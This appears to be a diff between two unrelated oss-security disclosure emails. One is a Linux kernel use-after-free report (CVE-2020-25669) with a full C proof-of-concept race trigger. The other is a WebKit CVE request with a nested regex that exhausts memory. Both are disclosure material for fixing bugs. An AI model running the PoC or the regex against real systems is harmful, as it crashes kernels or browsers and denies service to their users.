@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4686" "Thursday" "5" "November" "2020" "09:52:09" "+0800" "- Nop" "nopitydays@gmail.com" "<CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>" "212" "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil "11" "2020110501:52:09" "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" (number mark "U       nopitydays@g Nov  5  212/4686  " thread-indent "\"[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1656" "Saturday" "26" "November" "2016" "15:11:44" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdSfj16w6g_-WODTBY20AMFxw50qUJARvhhAByhR0yOrwg@mail.gmail.com>" "40" "[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit" nil nil nil "11" "2016112618:11:44" "[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit" (number mark "U       gustavo.grie Nov 26   40/1656  " thread-indent "\"[oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14268 invoked by uid 550); 5 Nov 2020 06:01:13 -0000
+Received: (qmail 6135 invoked by uid 550); 26 Nov 2016 18:11:57 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,249 +12,75 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 5127 invoked from network); 5 Nov 2020 01:52:32 -0000
+Received: (qmail 6112 invoked from network); 26 Nov 2016 18:11:56 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
+        d=gmail.com; s=20120113;
         h=mime-version:from:date:message-id:subject:to;
-        bh=jFm4vlYFajjJJ7CzX9DJSLr0iKRJAtJK5M716MAG9U4=;
-        b=AC7BcehWN6iwhD1Bs2F0B7vqHvN2Ecx0znfJKiOfqdhycL2hqjvkr68dheydfKMY/O
-         Qyf/xcPOrHUBHroipGBMkZsSSQP+508ZvJDYR2O71LIewLA0w5J6R8cTst0PM7FGhq9B
-         fzI5TCT+l4wdX+c5pQoPJJS2kjWQUCWq3g6efeIFec8EAvbLty/ez2unjziOqkJtovi7
-         6O+YXTNxAi0ppq8ufv6rTu8VghFHLFaW04AGbVfkvspqJadtrEeGWS7N7jnNTjAPiNmF
-         qSxRrHhFa9hhGnLYhdnbM2ZhcYZSkY2CTsLZ06mUr1vc1q601lbKc+9YCd+xx0YNFAed
-         fO9g==
+        bh=dVAuSmO6tsr70NkAN6YGY/1mCh6GWKsyeI3us8jg0LU=;
+        b=JRXDEMPyUPa3eIPHITq5lGyUqRZZJSegmAHQkQuV8r6aiDXHIRKOJLowb9yteygamf
+         4Bc/s8jQ5fCWS9/0rLdvqGMkXIoPQjNszs6TESgpNCJvNAuFKurdAsdrv6dAiMlNwrfv
+         x6aPxEsLPV+hTfU4h25f7iUU+w+1m++bdndttj80QroKgdNaotC/jXV8pUDO5xt0pc5R
+         gZdU5/LIkkvn3z39sE2i7wRc1Yjj/fhQNorelvqalucFMKPlnoYDPz3I6wzta+7tiinn
+         5ioqQEEeaPesp5cHxpjwXHhD7UZkTw8vtOcDQCVzqKAmiCPBa1uLnE6cVobhA4PZoEUA
+         yIrw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
+        d=1e100.net; s=20130820;
         h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=jFm4vlYFajjJJ7CzX9DJSLr0iKRJAtJK5M716MAG9U4=;
-        b=L6Oy9YQ4XyYIPcRZCP+nVV112Kw+A6iGqOEo+7Ch5BiEv3mgh+kFLk3YmHsYCjTHLg
-         YznZc7X2FuqxZrqxVL0WwKCFlDrzbhdQJD5ZDhGG9sp6D4HejXzymVxHUZhsAuT4cGeM
-         6PVeDSuf3gq3Jse6nNhB5FQodhFKFUEGkKrpVmre9dHtVAIOlhRaGGy6Hn2XV/9nLJ7H
-         Po1zxVO+KU8YKpmEdzrFVt/DRU1sXXP7ODpBpdcqvasV2a1EqTZikF8rc11iNiib4myW
-         AYoxfxni7+XUniQoeIVFelnHqlGbWiI+JxjLfb9npmuc7j5Ty7mg7CHEESPIrDJjgkKU
-         CvMQ==
-X-Gm-Message-State: AOAM531J61go4ZCXaVTG1VOtyTVZZsOCz3qt0A0z27KhISnJ/jpSs3gr
-	032UZ+ZeJNqXlzAVfvfKVBDRB5LZuBrns4x6EhxJ6YTqI25iEw==
-X-Google-Smtp-Source: ABdhPJyDf3tE192iTdJ4hHmK6VfEcsai/3KSHcSWcBp7CpfV6tjan/J7clQc8cD/r4UCrc3TBhhlcTOP+0cfPtXONR0=
-X-Received: by 2002:a1c:7dc8:: with SMTP id y191mr373238wmc.118.1604541140602;
- Wed, 04 Nov 2020 17:52:20 -0800 (PST)
+        bh=dVAuSmO6tsr70NkAN6YGY/1mCh6GWKsyeI3us8jg0LU=;
+        b=PP/NA+5N2HSb08hW2VDzKCAYuM7hI8kG02/x2SBTjkNqPMSuf2OdYDWVLxnhVTxgG+
+         BozJpJYhzDpSU+P5scSR5s7tkVeh0O7UF0vI/3uuck2jBvFvr7em2PgcghpawO+gmHL8
+         47k7bjJ509BIuwA1BXnlRXiWTn1+qOALfh4nArKt8PQ3gB4hd80cyQy08aQHKUGmH1aR
+         NRrE08mfjQsR/R08tTYMDhELFibm134mgfpxsWwYuMT1Sdw8ig07OUf1eg8NNEwnGSLD
+         l5T9CSQQqcvHiHzbFWSiSJF7zd6QN9qLb9pzu3HwvzWkaWoSaTIpm201KmWAVvf+4jQQ
+         mwMw==
+X-Gm-Message-State: AKaTC02LuGPkDWYTJjJcB+gpo4murVqBzQLJK97smPX+1NSRP7wyGna/QddhuD/389MoIGtvqMfWLonLg0iYbA==
+X-Received: by 10.36.178.74 with SMTP id h10mr11851206iti.37.1480183904655;
+ Sat, 26 Nov 2016 10:11:44 -0800 (PST)
 MIME-Version: 1.0
-From: - Nop <nopitydays@gmail.com>
-Date: Thu, 5 Nov 2020 09:52:09 +0800
-Message-ID: <CA+-U7QCogh=QnA3g8=m6Y=yJsMvijxbFpVOrc_UcgB_T_5uyRw@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000b6948205b352588a"
-Subject: [oss-security] CVE-2020-25669: Linux Kernel use-after-free in sunkbd_reinit
+From: Gustavo Grieco <gustavo.grieco@gmail.com>
+Date: Sat, 26 Nov 2016 15:11:44 -0300
+Message-ID: <CACn5sdSfj16w6g_-WODTBY20AMFxw50qUJARvhhAByhR0yOrwg@mail.gmail.com>
+To: oss-security@lists.openwall.com, cve-assign@mitre.org
+Content-Type: multipart/alternative; boundary=f403045d8fb0d6e0940542382b6d
+Subject: [oss-security] CVE Request: resource exhaustion in regex expression handling in WebKit
 
---000000000000b6948205b352588a
-Content-Type: text/plain; charset="UTF-8"
+--f403045d8fb0d6e0940542382b6d
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
 
-Hi,
+Hello,
 
-We found a use-after-free read in sunkbd_reinit located in
-drivers/input/keyboard/sunkbd.c,
-and reproduced it in the latest kernel version (v5.9.4 for now) with
-CONFIG_KEYBOARD_SUNKBD=y and CONFIG_KASAN=y.
+Trying to parse and execute this regex code in WebKit:
 
-The root cause of this BUG is :
+/($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($=
+($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(=
+$($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($=
+($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($($(=
+$($($($($($($($($($($($($($($($($($($($($($(${-2,16}+)+)+)+)+)+)+)+)+)+)+)+=
+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)=
++)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+=
+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)=
++)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+)+=
+)+)+)+)+)+)+)+)+)+)+)/
 
-The function sunkbd_reinit having been scheduled by sunkbd_interrupt before
-the struct sunkbd being freed.
-Though the dangling pointer is set to NULL in sunkbd_disconnect, there is
-still an alias in sunkbd_reinit thus causing UAF.
+will consume large amounts of memory (8GB or more), after a few seconds.
+This seems to be a case of CWE-400 (uncontrolled resource consumption).
 
-Timeline:
-* 2020/10/21 - Vulnerability reported to security@kernel.org.
-* 2020/10/27 - Vulnerability reported to linux-distros@vs.openwall.org.
-* 2020/10/27 - CVE-2020-25669 assigned.
-* 2020/11/05 - Vulnerability opened.
+At least, version 2.4.11 Webkit and very recent webkit revisions like
+https://github.com/WebKit/webkit/commit/fcf81f3ad83cd910727c7a1824e503
+77a474c8f4 are affected.
+
+You can quickly test this issue in different webkit browsers here:
+
+https://dcc.fceia.unr.edu.ar/~ggrieco/oom.html
+
+Fortunately, Chrome and Firefox based browsers are *not* affected.
+
+Please assign a CVE if suitable. It is worth to mention, that a month ago,
+i asked to MITRE about another issue related with uncontrolled resource
+consumption in Firefox loading a SVG but receive no response.
 
 Regards,
-Bodong Zhao from Tsinghua University
+Gustavo.
 
-------------------------------------
-PoC:
-
-// autogenerated by syzkaller (https://github.com/google/syzkaller)
-// nop@THU
-#define _GNU_SOURCE
-
-#include <endian.h>
-#include <errno.h>
-#include <pthread.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sys/types.h>
-#include <time.h>
-#include <unistd.h>
-#include <fcntl.h>
-
-#include <linux/futex.h>
-
-static void sleep_ms(uint64_t ms)
-{
-  usleep(ms * 1000);
-}
-
-static uint64_t current_time_ms(void)
-{
-  struct timespec ts;
-  if (clock_gettime(CLOCK_MONOTONIC, &ts))
-    exit(1);
-  return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
-}
-
-static void thread_start(void* (*fn)(void*), void* arg)
-{
-  pthread_t th;
-  pthread_attr_t attr;
-  pthread_attr_init(&attr);
-  pthread_attr_setstacksize(&attr, 128 << 10);
-  int i;
-  for (i = 0; i < 100; i++) {
-    if (pthread_create(&th, &attr, fn, arg) == 0) {
-      pthread_attr_destroy(&attr);
-      return;
-    }
-    if (errno == EAGAIN) {
-      usleep(50);
-      continue;
-    }
-    break;
-  }
-  exit(1);
-}
-
-typedef struct {
-  int state;
-} event_t;
-
-static void event_init(event_t* ev)
-{
-  ev->state = 0;
-}
-
-static void event_reset(event_t* ev)
-{
-  ev->state = 0;
-}
-
-static void event_set(event_t* ev)
-{
-  if (ev->state)
-    exit(1);
-  __atomic_store_n(&ev->state, 1, __ATOMIC_RELEASE);
-  syscall(SYS_futex, &ev->state, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1000000);
-}
-
-static void event_wait(event_t* ev)
-{
-  while (!__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
-    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, 0);
-}
-
-static int event_isset(event_t* ev)
-{
-  return __atomic_load_n(&ev->state, __ATOMIC_ACQUIRE);
-}
-
-static int event_timedwait(event_t* ev, uint64_t timeout)
-{
-  uint64_t start = current_time_ms();
-  uint64_t now = start;
-  for (;;) {
-    uint64_t remain = timeout - (now - start);
-    struct timespec ts;
-    ts.tv_sec = remain / 1000;
-    ts.tv_nsec = (remain % 1000) * 1000 * 1000;
-    syscall(SYS_futex, &ev->state, FUTEX_WAIT | FUTEX_PRIVATE_FLAG, 0, &ts);
-    if (__atomic_load_n(&ev->state, __ATOMIC_ACQUIRE))
-      return 1;
-    now = current_time_ms();
-    if (now - start > timeout)
-      return 0;
-  }
-}
-
-struct thread_t {
-  int created, call;
-  event_t ready, done;
-};
-
-static struct thread_t threads[2];
-static void execute_call(int call);
-static int running;
-
-static void* thr(void* arg)
-{
-  struct thread_t* th = (struct thread_t*)arg;
-  for (;;) {
-    event_wait(&th->ready);
-    event_reset(&th->ready);
-    execute_call(th->call);
-    __atomic_fetch_sub(&running, 1, __ATOMIC_RELAXED);
-    event_set(&th->done);
-  }
-  return 0;
-}
-
-static void loop(void)
-{
-  int i, call, thread;
-  for (call = 0; call < 2; call++) {
-    for (thread = 0; thread < (int)(sizeof(threads) / sizeof(threads[0]));
-         thread++) {
-      struct thread_t* th = &threads[thread];
-      if (!th->created) {
-        th->created = 1;
-        event_init(&th->ready);
-        event_init(&th->done);
-        event_set(&th->done);
-        thread_start(thr, th);
-      }
-      if (!event_isset(&th->done))
-        continue;
-      event_reset(&th->done);
-      th->call = call;
-      __atomic_fetch_add(&running, 1, __ATOMIC_RELAXED);
-      event_set(&th->ready);
-      event_timedwait(&th->done, 45);
-      break;
-    }
-  }
-  for (i = 0; i < 100 && __atomic_load_n(&running, __ATOMIC_RELAXED); i++)
-    sleep_ms(1);
-}
-
-uint64_t fd;
-char buf[100];
-
-void execute_call(int call)
-{
-  int disc = 0x2;
-  char ch = 0xff;
-
-  switch (call) {
-  case 0:
-    // call sunkbd_disconnect
-    read(fd, buf, 0);
-    break;
-  case 1:
-    // call sunkbd_interrupt
-    ioctl(fd, 0x5412, &ch); // TIOCSTI
-    break;
-  }
-}
-int main(void)
-{
-  int disc = 0x2;
-  fd = open("/dev/ptmx", O_RDWR, 0);
-  ioctl(fd, 0x5423, &disc); // TIOCSETD
-  loop();
-  return 0;
-}
-
---000000000000b6948205b352588a--
+--f403045d8fb0d6e0940542382b6d--
